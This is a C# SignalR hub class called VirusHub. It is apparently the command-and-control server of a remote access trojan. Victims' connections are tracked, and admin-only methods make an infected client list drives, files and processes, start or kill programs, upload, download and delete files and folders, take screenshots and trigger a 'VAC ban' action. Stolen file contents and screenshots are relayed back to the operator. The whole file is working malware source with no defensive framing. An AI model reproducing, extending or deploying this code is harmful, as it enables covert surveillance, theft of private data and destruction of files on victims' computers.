using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.SignalR;
using SerializableObjectsLibrary;
using Server.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

namespace Server.Hubs
{
    public class VirusHub : Hub
    {
        private List<ConnectedUser> _connectedUsers;
        public VirusHub(List<ConnectedUser> connectedUsers) =>
            _connectedUsers = connectedUsers;

        public override async Task OnConnectedAsync()
        {
            string arminRoleString = Roles.Admin.ToString();

            if (Context.User.IsInRole(arminRoleString) == false)
            {
                ConnectedUser connectedUser = new ConnectedUser("none", Context.ConnectionId);
                _connectedUsers.Add(connectedUser);
                await Clients.Group(arminRoleString).SendAsync("OnNewConnectionUser", connectedUser);
            }
            else
            {
                await Groups.AddToGroupAsync(Context.ConnectionId, arminRoleString);
            }
        }
        public override async Task OnDisconnectedAsync(Exception exception)
        {

            string arminRoleString = Roles.Admin.ToString();

            if (Context.User.IsInRole(arminRoleString) == false)
            {
                var user = _connectedUsers.FirstOrDefault(u => u.ConnectionId == Context.ConnectionId);
                if (user != null)
                {
                    _connectedUsers.Remove(user);
                    await Clients.Group(arminRoleString).SendAsync("OnUserDisconnect", user);
                }
            }
        }
        
        //to admin
        public async Task GetAllConnectedUsers()
        {
            await Clients.Caller.SendAsync("OnGetAllConnectedUsers", _connectedUsers
                .Where(u => u.ConnectionId != Context.ConnectionId));
        }
        public async Task Notify(string callerId, string message)
        {
            await Clients.Client(callerId).SendAsync("OnNotification", message);
        }
        public async Task SendProcessingInfo(string callerId, string information)
        {
            await Clients.Client(callerId).SendAsync("OnGetProcessingInfo", information);
        }
        public async Task SendDrivesToCaller(string callerId, List<string> drives)
        {
            await Clients.Client(callerId).SendAsync("OnGetDrives", drives);
        }
        public async Task SendFilesToCaller(string callerId, List<string> files)
        {
            await Clients.Client(callerId).SendAsync("OnGetFiles", files);
        }
        public async Task SendRunningProcessesToCaller(string callerId, List<string> runningProcesses)
        {
            await Clients.Client(callerId).SendAsync("OnGetRunningProcesses", runningProcesses);
        }
        public async Task SendDownloadFile(string callerId, byte[] buffer, string fileName, string directoryName)
        {
            await Clients.Client(callerId).SendAsync("OnGetDownloadFile", buffer, fileName, directoryName);
        }
        public async Task SendScreenshot(string callerId, byte[] buffer)
        {
            await Clients.Client(callerId).SendAsync("OnGetScreenshot", buffer);
        }

        //to client
        [Authorize(Roles="Admin")]
        public async Task TakeVAC(string userConnectionId) =>
            await InvokeMethodOnClientAsync("OnGetVACBan", userConnectionId);

        [Authorize(Roles="Admin")]
        public async Task GetProcessingInfo(string userConnectionId) =>
            await InvokeMethodOnClientAsync("OnGetProcessingInfo", userConnectionId);

        [Authorize(Roles="Admin")]
        public async Task GetRunningProcesses(string userConnectionId) =>
            await InvokeMethodOnClientAsync("OnGetRunningProcesses", userConnectionId);

        [Authorize(Roles="Admin")]
        public async Task GetDrivers(string userConnectionId) =>
            await InvokeMethodOnClientAsync("OnGetDrives", userConnectionId);

        [Authorize(Roles="Admin")]
        public async Task GetFiles(string userConnectionId, string directory) =>
            await InvokeMethodOnClientAsync("OnGetFiles", userConnectionId, directory);
        
        [Authorize(Roles="Admin")]
        public async Task StartProcess(string userConnectionId, string processPath) =>
            await InvokeMethodOnClientAsync("OnStartProcess", userConnectionId, processPath);

        [Authorize(Roles="Admin")]
        public async Task AbortProcess(string userConnectionId, string processName) =>
            await InvokeMethodOnClientAsync("OnAbortProcess", userConnectionId, processName);

        [Authorize(Roles = "Admin")]
        public async Task DownloadFile(string userConnectionId, string filePath) =>
            await InvokeMethodOnClientAsync("OnDownloadFile", userConnectionId, filePath);

        [Authorize(Roles = "Admin")]
        public async Task SendFile(string userConnectionId, byte[] buffer, string fileName, string directoryName) =>
            await Clients.Client(userConnectionId).SendAsync("OnSendFile", buffer, fileName, directoryName);

        [Authorize(Roles = "Admin")]
        public async Task DeleteFile(string userConnectionId, string filePath) =>
            await InvokeMethodOnClientAsync("OnDeleteFile", userConnectionId, filePath);

        [Authorize(Roles = "Admin")]
        public async Task DeleteDirectory(string userConnectionId, string directoryPath) =>
            await InvokeMethodOnClientAsync("OnDeleteDirectory", userConnectionId, directoryPath);

        [Authorize(Roles = "Admin")]
        public async Task MakeScreenshot(string userConnectionId) =>
            await InvokeMethodOnClientAsync("OnMakeScreenshot", userConnectionId);

        private async Task InvokeMethodOnClientAsync(string methodName, string userConnectionId, string parameterOne = null, string parameterTwo = null)
        {
            if (UserIsConnected(userConnectionId))
            {
                var client = Clients.Client(userConnectionId);
                string callerId = Context.ConnectionId;

                if (parameterOne is null)
                    await client.SendAsync(methodName, callerId);
                else if(parameterTwo is null)
                    await client.SendAsync(methodName, callerId, parameterOne);
            }
        }

        private bool UserIsConnected(string connectionId)
        {
            if (_connectedUsers.Any(u => u.ConnectionId == connectionId))
                return true;

            Clients.Caller.SendAsync("OnFail", $"User with Id: {connectionId} is not connected");
            return false;
        }
    }
}